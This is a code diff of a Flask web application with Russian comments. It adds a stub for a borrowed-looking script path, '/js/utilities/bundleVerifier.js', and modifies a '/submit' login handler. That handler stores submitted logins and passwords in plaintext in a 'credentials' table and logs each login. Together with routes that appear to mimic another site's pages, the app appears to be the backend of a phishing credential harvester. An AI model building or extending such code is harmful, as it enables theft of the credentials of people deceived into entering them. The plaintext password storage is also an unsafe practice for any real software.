@@ -495,10 +495,6 @@ def hot_right_now():
 def top_revisited():
     logger.info("Запрос на /toprevisted")
     return render_template('toprevisted.html')
-# Настройка логирования
-logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
-
 # Обработка ошибок 404
 @app.errorhandler(404)
 def page_not_found(e):
@@ -516,7 +512,16 @@ def favicon():
     favicon_path = os.path.join(app.static_folder, 'favicon.ico')
     if os.path.exists(favicon_path):
         return send_file(favicon_path)
-    return '', 204  # Возвращаем пустой ответ, если favicon нет
+    return '', 204
+
+# Маршрут для bundleVerifier.js (заглушка)
+@app.route('/js/utilities/bundleVerifier.js')
+def bundle_verifier():
+    logger.info("Запрос bundleVerifier.js")
+    js_path = os.path.join(app.static_folder, 'js', 'utilities', 'bundleVerifier.js')
+    if os.path.exists(js_path):
+        return send_file(js_path)
+    return '// Bundle verifier stub', 200, {'Content-Type': 'application/javascript'}
 
 # Обновлённый маршрут /submit
 @app.route('/submit', methods=['POST'])
@@ -537,11 +542,11 @@ def submit_login():
             with conn.cursor() as c:
                 c.execute(
                     '''
-                    INSERT INTO credentials (login, password, added_time, added_by)
-                    VALUES (%s, %s, %s, %s)
+                    INSERT INTO credentials (login, password, added_time)
+                    VALUES (%s, %s, %s)
                     ON CONFLICT (login) DO NOTHING
                     ''',
-                    (login, password, get_current_time().isoformat(), "web_form")
+                    (login, password, get_current_time().isoformat())
                 )
                 conn.commit()
                 logger.info(f"Сохранено в базе: login={login}")
